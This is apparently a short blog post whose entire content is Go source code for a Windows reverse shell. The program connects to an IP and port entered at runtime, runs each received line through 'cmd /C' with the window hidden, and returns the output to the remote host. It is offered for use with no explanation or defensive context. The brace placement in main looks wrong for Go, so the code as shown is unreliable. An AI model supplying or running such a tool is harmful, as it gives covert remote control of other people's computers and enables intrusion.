---
layout: post
title:  "Simple Go Reverse Shell"
date:   2019-09-01 00:00:00 -0400
categories: 
---

```
package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"	
	"syscall"
)

func main() 
{	
	var host string
	var port string
	
	fmt.Print("IP: ")    
	fmt.Scanln(&host)
	fmt.Print("Port: ")
	fmt.Scanln(&port)
	
	c, _ := net.Dial("tcp", host + ":" + port)
	r := bufio.NewReader(c)
	for {
		order, _ := r.ReadString('\n')
		cmd := exec.Command("cmd", "/C", order)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.CombinedOutput()
		c.Write(out)
	}
}
```
